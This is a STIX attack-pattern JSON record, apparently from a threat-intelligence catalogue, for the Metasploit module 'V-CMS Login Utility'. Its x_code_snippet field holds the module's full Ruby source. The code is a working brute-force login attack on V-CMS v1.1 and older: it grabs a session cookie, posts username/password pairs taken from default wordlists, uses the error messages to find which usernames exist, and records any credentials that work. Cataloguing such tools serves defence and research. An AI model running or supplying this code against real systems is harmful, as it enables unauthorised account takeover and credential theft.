{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--82a7fda7-c048-4cbe-89f7-3dd644157c8e",
    "created": "2024-08-14T16:29:17.907301Z",
    "modified": "2024-08-14T16:29:17.907304Z",
    "name": "V-CMS Login Utility",
    "description": " This module attempts to authenticate to an English-based V-CMS login interface. It should only work against version v1.1 or older, because these versions do not have any default protections against brute forcing. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/vcms_login.rb",
            "external_id": "vcms_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'V-CMS Login Utility',\n      'Description'    => %q{\n        This module attempts to authenticate to an English-based V-CMS login interface. It\n        should only work against version v1.1 or older, because these versions do not have\n        any default protections against brute forcing.\n      },\n      'Author'         => [ 'sinn3r' ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptPath.new('USERPASS_FILE',  [ false, \"File containing users and passwords separated by space, one pair per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_userpass.txt\") ]),\n        OptPath.new('USER_FILE',  [ false, \"File containing users, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_users.txt\") ]),\n        OptPath.new('PASS_FILE',  [ false, \"File containing passwords, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_pass.txt\") ]),\n        OptString.new('TARGETURI', [true, 'The URI path to V-CMS', '/vcms2/'])\n      ])\n  end\n\n\n  def get_sid\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => @uri\n    })\n\n    # Get the PHP session ID\n    m = res.get_cookies.match(/(PHPSESSID=.+);/)\n    id = (m.nil?) ? nil : m[1]\n\n    return id\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_login(user, pass)\n    begin\n      sid = get_sid\n      if sid.nil?\n        vprint_error(\"Failed to get sid\")\n        return :abort\n      end\n\n      res = send_request_cgi({\n        'uri'    => \"#{@uri}process.php\",\n        'method' => 'POST',\n        'cookie' => sid,\n        'vars_post' => {\n          'user'     => user,\n          'pass'     => pass,\n          'sublogin' => '1'\n        }\n      })\n      location = res.headers['Location']\n      res = send_request_cgi({\n        'uri' => location,\n        'method' => 'GET',\n        'cookie' => sid\n      })\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n      vprint_error(\"Service failed to respond\")\n      return :abort\n    end\n\n    if res\n      case res.body\n      when /User name does not exist/\n        return :skip_user\n      when /User name is not alphanumeric/\n        return :skip_user\n      when /User name not entered/\n        return :skip_user\n      when /User name already confirmed/\n        return :skip_user\n      when /Invalid password/\n        vprint_status(\"Username found: #{user}\")\n      when /\\<a href=\"process\\.php\\?logout=1\"\\>/\n        print_good(\"Successful login: \\\"#{user}:#{pass}\\\"\")\n        report_cred(ip: rhost, port: rport, user:user, password: pass, proof: res.body)\n        return :next_user\n      end\n    end\n\n    return\n  end\n\n  def run\n    @uri = normalize_uri(target_uri.path)\n    @uri << \"/\" if @uri[-1, 1] != \"/\"\n\n    super\n  end\n\n  def run_host(ip)\n    each_user_pass { |user, pass|\n      vprint_status(\"Trying \\\"#{user}:#{pass}\\\"\")\n      do_login(user, pass)\n    }\n  end\nend\n"
}